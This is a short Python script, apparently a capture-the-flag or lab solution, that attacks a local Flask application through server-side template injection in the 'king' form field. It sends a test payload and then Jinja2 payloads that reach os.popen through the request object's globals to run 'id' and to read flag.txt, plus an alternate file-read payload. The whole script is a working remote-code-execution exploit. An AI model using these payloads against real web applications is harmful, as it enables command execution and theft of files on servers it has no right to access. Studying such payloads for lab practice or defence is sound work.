import requests

URL = "http://127.0.0.1:5000"



def showSSTI():
    """
    Demo that SSTI works
    """
    payload = {"king": "{{ 4+4 }}"}
    r = requests.post(URL, data=payload)
    print (r.text)

def runCommand():
    """
    Run a System Level command
    """
    payload = {"king" : "{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}" }
    
    r = requests.post(URL, data=payload)
    print (r.text)
    

def getFlag():
    """
    Run a System Level command
    """
    payload = {"king" : "{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat flag.txt')['read']()}}" }

    #An Alternate payload
    #payload = {"king": "{{ request['application']['__globals__']['__builtins__'].open('flag.txt').read() }}"}
    
    r = requests.post(URL, data=payload)
    print (r.text)


if __name__ == "__main__":
    #showSSTI()
    #runCommand()
    getFlag()
